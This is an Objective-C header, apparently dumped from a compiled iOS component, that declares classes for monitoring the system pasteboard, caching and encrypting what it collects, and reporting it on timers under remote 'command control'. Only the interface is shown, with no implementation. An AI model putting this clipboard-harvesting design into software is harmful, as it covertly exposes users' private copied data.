#pragma once
#import <Foundation/Foundation.h>
@class JCommonReportTimerManager;
typedef void (^JCommonPasteCompletion)(BOOL success, NSArray *data);
@interface JCommonPasteController : NSObject {
    JCommonReportTimerManager *_collectTimerManager;
    JCommonReportTimerManager *_reportTimerManager;
    BOOL _monitorPasteboardChange;
    int _action;
    int _cacheLimit;
    long long _collectInterval;
    long long _reportInterval;
    NSArray *_pasteDatas;
    NSString *_lastPasteData;
}
@property(nonatomic) int action;
@property(nonatomic) long long collectInterval;
@property(nonatomic) long long reportInterval;
@property(nonatomic) int cacheLimit;
@property(nonatomic) BOOL monitorPasteboardChange;
@property(strong, nonatomic) NSArray *pasteDatas;
@property(strong, nonatomic) NSString *lastPasteData;
- (instancetype)init;
- (void)configInitData;
- (void)startPasteStrategy;
- (void)stopPasteStrategy;
- (void)startCollectAction;
- (void)endCollectAction;
- (void)addReportTimer;
- (void)removeReportTimer;
- (id)filterPasteArrayData:(id)data;
- (id)filterPasteDictData:(id)data;
- (void)triggerCollectTimer:(id)timer;
- (void)cachePasteDatas:(id)data;
- (void)removeReportedPasteDatas:(id)data;
- (void)triggerReportTimer:(id)timer;
- (NSString *)encryptKeyWithSeed:(long long)seed;
- (void)handlePasteboardChanged:(id)notification;
- (void)handleCmdControl:(id)notification;
@end
@interface JCommonPasteReportManager : NSObject {
    NSArray *_pasteDatas;
    JCommonPasteCompletion _reportCompletion;
}
@property(strong, nonatomic) NSArray *pasteDatas;
@property(copy, nonatomic) JCommonPasteCompletion reportCompletion;
- (void)report;
- (NSDictionary *)pasteboardInfo;
@end
